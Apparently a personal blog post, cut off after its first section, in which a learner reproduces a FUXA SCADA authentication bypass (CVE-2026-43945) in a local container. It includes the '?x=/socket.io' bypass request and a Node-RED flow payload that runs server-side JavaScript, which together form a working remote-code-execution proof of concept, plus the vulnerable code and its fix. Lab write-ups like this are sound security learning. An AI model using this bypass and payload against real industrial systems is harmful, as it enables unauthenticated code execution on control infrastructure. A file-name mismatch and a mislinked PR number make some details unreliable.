---
layout: 'blog.njk'
title: Amateur Analysis of SCADA Software CVE
description: Analyzing three CVEs on SCADA software authentication with a 3rd party integration
tags: blog
date: 2026-11-23
---

# Amateur Analysis of SCADA Software CVE

I'm experimenting with something beyond my expertise. Exploring a totally new field which I have no prior knowledge about.
This time I'm reading about Common Vulnerabilities and Exposures (CVE) report in an open-source project I found in Github.
The project that I'm looking at is [FUXA](https://github.com/frangoteam/FUXA). A web-based SCADA (Supervisory Control and
Data Acquisition) software that allows us to build modern dashboards to monitor connected machines using standard protocols.

I'm interested in this project because I'm currently building my experience in ICS (Industrial Control System) security from
zero. This is intriguing since I finished reading [Countdown to Zero Day](https://www.goodreads.com/en/book/show/18465875-countdown-to-zero-day)
by Kim Zetter. It was a mind-blowing read, I didn't know how lines of code could be used to sabotage a nuclear-plant which had
full of heavy mechanics and not exposed to the internet. Since my background is full-stack web development and I learned a
little bit of embedded system during college, I started from the most familiar part about ICS: the web UI and
connector integration. I find FUXA as a suitable starting point for me to learn about SCADA software.

## Reading CVE Report

The first CVE I was reading on was security bypass vulnerability using path manipulation ([CVE-2026-43945](https://www.cve.org/CVERecord?id=CVE-2026-43945)).
This could happen when we access a protected endpoint then manipulating the original path of the URL to bypass it. For this case,
it was endpoint to access [Node-RED](https://nodered.org/) feature to manipulate flows of a project. Node-RED is a low-code
development tool to build automation or industrial control system. My experience on this tool is very limited, I knew it since
one of my friend in the past used this to prototype his final project in college. However, the vulnerability here is not on
the Node-RED but the *connector*, the part which makes it possible for FUXA to integrate with Node-RED.

### Path Manipulation Vulnerability

FUXA has monolithic architecture, a client and a server run as a single process and accessed through a single port. Although the
code component is modular (client and server are different component), it is deployed as a single unit.

![Simplified FUXA client-server architecture](/images/analyzing-scada-software-cve/fuxa-client-server-architecture.png "Figure 1. Simplified Fuxa Client Server Architecture")

The architecture shown on Figure 1 is trimmed down version of FUXA application architecture. FUXA doesn't just support Node-RED
but also Siemens S7, and other standard industrial protocols. We're focusing on Node-RED since the CVE is related to this
connector.

Accessing the Node-RED feature can be done by calling `/nodered` path. Although there are several paths, we are focusing on crucial
one, which is `/nodered/flows`. The [endpoint](https://nodered.org/docs/api/admin/methods/post/flows/) `/nodered/flows` deploys
a flow configuration which may have function nodes that could execute arbitrary server-side JavaScript when triggered. We can
say *flow* the same as source code in programming but since Node-RED is a low-code visual programming tool, it is called '[flow](https://nodered.org/docs/user-guide/concepts)'.

So what happen in the CVE report is, while the path `/nodered/*` is already protected and requires a credential, it can still be
bypassed just by modifying the path. Say if we want to create or modify a flow, normally we send a POST request to `/nodered/flows`
with a body of flow configuration and a credential. Yet in this report, it can bypassed by modifying the path to `/nodered/flows?x=/socket.io`.

We can test this by pull the container image for version 1.2.11 from https://hub.docker.com/r/frangoteam/fuxa. We also need to
set the `secureEnabled` setting to `true`. This can be done by mounting volume `/usr/src/app/FUXA/server/_appdata` in container
to any directory where it has `settings.js` in our local directory. The configuration file should at least have this value:

```js
module.exports = {
    // Authentication and token signing.
    // secretCode signs JWTs: keep it long and random anywhere non-isolated.
    secureEnabled: true,
    secretCode: 'lab-only-secret',
    tokenExpiresIn: '1h',

    // Node-RED integration, auth required.
    nodeRedEnabled: true,
    nodeRedAuthMode: 'secure',
}
```

Another value we need to look at is `nodeRedEnabled` which enable Node-RED connector, otherwise the endpoint would not exist.
Once the container is running, we can call port 1881 to test it.

```
> curl -iX POST localhost:1881/nodered/flows
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept
Content-Type: application/json; charset=utf-8
Content-Length: 67
ETag: W/"43-xavDh2CbibrgLEnD0WSI2j5gjl4"
Date: Tue, 24 Nov 2026 14:21:56 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"error":"unauthorized_error","message":"Authentication required!"}
```

The authentication works, it is rejecting with HTTP 401 when we are not passing credential. Now let's test the bypass method,
we are adding a query parameter `?x=/socket.io` at the end of the URL path.

```
> curl -iX POST localhost:1881/nodered/flows?x=/socket.io
HTTP/1.1 400 Bad Request
X-Powered-By: Express
Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Content-Length: 72
ETag: W/"48-GNgTwSgYngmuEUMiql32UdMZN34"
Date: Tue, 24 Nov 2026 14:38:43 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"code":"unexpected_error","message":"config.forEach is not a function"}
```

Well, look at that. We got HTTP 400 now, it doesn't complain about the authentication but missing payload. The exception error
gives us clue it was failing to iterate an array. Since this endpoint is used to set a flow, we are going to build one
through API. Let's try to create a flow that executes a code to write a new file. This file will be written in the server
machine where FUXA is running, in other words, in the container. So let's write it to `/tmp` directory as POC. Here's the
payload:

```json
[
    {
        "id": "tab-lab",
        "type": "tab",
        "label": "lab"
    },
    {
        "id": "inject-lab",
        "type": "inject",
        "z": "tab-lab",
        "once": true,
        "onceDelay": "0.1",
        "payload": "",
        "payloadType": "date",
        "x": 160,
        "y": 120,
        "wires": [
            [
                "function-proof"
            ]
        ]
    },
    {
        "id": "function-proof",
        "type": "function",
        "z": "tab-lab",
        "name": "write marker",
        "func": "const fs = global.get('fs');\nfs.writeFile('/tmp/fuxa-rce-proof.txt','FUXA labproof').then(() => node.warn('Marker written')).catch(err => node.error(err,msg));\nreturn msg;",
        "outputs": 0,
        "x": 360,
        "y": 120,
        "wires": []
    }
]
```

The flow is very minimal, one inject (timestamp) and one function node. It is just executing a function once the flow is
deployed and triggered by 'inject' after 0.1s delay on startup. Save it in a file **payload.json**, then send the payload in
the POST request. This is the response:

```
> curl -iX POST --json @leak.json localhost:1881/nodered/flows?x=/socket.io
HTTP/1.1 204 No Content
X-Powered-By: Express
Access-Control-Allow-Methods: GET,PUT,POST,DELETE,OPTIONS
Access-Control-Allow-Headers: x-access-token, x-auth-user, Origin, Content-Type, Accept
Access-Control-Allow-Origin: *
Date: Wed, 25 Nov 2026 04:21:47 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

Well, well, well. Looks like something just happened. Let's look at http://localhost:1881/flows to check the created flow.

![Flow created after the path-manipulation bypass](/images/analyzing-scada-software-cve/created-flow-after-path-manipulation.png "Figure 2. Created Flow After Bypassing Through Path Manipulation")

We can see the flow is created and the function does match with the payload we sent before. Let's see what's in the `/tmp` directory.

```
> podman exec fuxa ls /tmp; echo "FILE content: $(podman exec fuxa cat /tmp/fuxa-rce-proof.txt)"
fuxa-rce-proof.txt
scarf-js-history-root.log
FILE content: FUXA labproof
```

There it is, we just executed a code inside the server after bypassing the security by manipulating the path. This is the reported
vulnerability in [CVE-2026-43945](https://www.cve.org/CVERecord?id=CVE-2026-43945). This vulnerability is introduced by [PR #2182](https://github.com/frangoteam/FUXA/pull/2182)
which added authentication to `/nodered/*` endpoint but missed to properly handle `/dashboard` and `/socket.io` path. This
piece of code executed before the authentication happens,

```js
const url = req.originalUrl || req.url || req.path;
if (url.includes('/dashboard') || url.includes('/socket.io')) return next();
```

Since `req.originalUrl` is retaining the original URL, the path that was assume to be `/dashboard` and `/socket.io` as valid was
actually consider `/nodered/flows?x=/socket.io` to be valid also. When this match, the code skip the authentication part on
the next line and proceed to process the request. The solution is it shouldn't include the query parameter at all but only the
path, hence on [PR #2660](https://github.com/frangoteam/FUXA/pull/2260/files) it replaces it with `req.baseUrl`.

I wonder, how come this vulnerability exists? what was the change that introduced this? It turned out, if we look again at [PR #2182](https://github.com/frangoteam/FUXA/pull/2182)
and check the vulnerability report, that PR was created to patch another vulnerability, [CVE-2026-25938](https://www.cve.org/CVERecord?id=CVE-2026-25938).
The vulnerabity report is about unauthenticated `/nodered/*` endpoint which it protects `/nodered` endpoint but skip authentication
several endpoints including `/nodered/flows`.

### When Convenience Beats Security
